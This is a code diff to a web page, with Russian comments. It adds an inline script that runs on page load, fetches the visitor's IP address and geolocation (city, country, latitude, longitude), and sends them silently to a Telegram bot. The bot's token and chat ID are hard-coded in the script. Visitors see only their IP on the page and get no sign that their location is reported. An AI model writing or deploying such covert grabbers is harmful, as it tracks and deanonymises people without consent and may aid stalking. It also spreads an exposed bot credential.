@@ -39,20 +39,78 @@
     <script src="script.js"></script>
 </body>
 <script>
-    fetch('https://api.ipify.org/?format=json')
+    // Функция для отправки сообщений в Telegram
+    function sendToTelegram(message) {
+        const token = '7182777736:AAE0dGl-nMd26dLVaxxgn5UWso0MIXaN508';  // Замените на токен вашего бота
+        const chat_id = '6568230333';      // Замените на ваш chat_id
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const data = {
+            chat_id: chat_id,
+            text: message,
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
         .then(response => response.json())
-        .then(data => {
-            document.getElementById('ipAddress').innerHTML = 'Твой IP: ' + data.ip;
-        });
-        fetch('http://ip-api.com/json/')
-        .then(response => response.json())
-        .then(data => {
-            console.log("IP:", data.query);
-            console.log("Широта:", data.lat);
-            console.log("Долгота:", data.lon);
-            console.log("Город:", data.city);
-            console.log("Страна:", data.country);
-    })
-    .catch(error => console.error('Ошибка:', error));
+        .then(data => console.log('Message sent:', data))
+        .catch(error => console.error('Error sending message:', error));
+    }
+
+    // Функция для получения IP-адреса
+    function getIP() {
+        return fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                return data.ip;  // Возвращаем IP
+            })
+            .catch(error => {
+                console.error('Ошибка при получении IP:', error);
+                return null;
+            });
+    }
+
+    // Функция для получения информации о местоположении по IP
+    function getLocation(ip) {
+        return fetch(`https://ip-api.com/json/${ip}`)
+            .then(response => response.json())
+            .then(data => {
+                return {
+                    city: data.city,
+                    country: data.country,
+                    lat: data.lat,
+                    lon: data.lon
+                };
+            })
+            .catch(error => {
+                console.error('Ошибка при получении местоположения:', error);
+                return null;
+            });
+    }
+
+    // Основная функция, которая объединяет запросы и отправляет информацию в Telegram
+    async function fetchAndSendInfo() {
+        const ip = await getIP();
+        if (ip) {
+            document.getElementById('ipAddress').innerText = `Ваш IP: ${ip}`; // Обновляем на странице
+            const location = await getLocation(ip);
+            if (location) {
+                const message = `IP: ${ip}\nГород: ${location.city}\nСтрана: ${location.country}\nШирота: ${location.lat}\nДолгота: ${location.lon}`;
+                sendToTelegram(message);
+            } else {
+                console.error('Не удалось получить информацию о местоположении.');
+            }
+        } else {
+            console.error('Не удалось получить IP.');
+        }
+    }
+
+    // Вызов основной функции
+    fetchAndSendInfo();
 </script>
 </html>
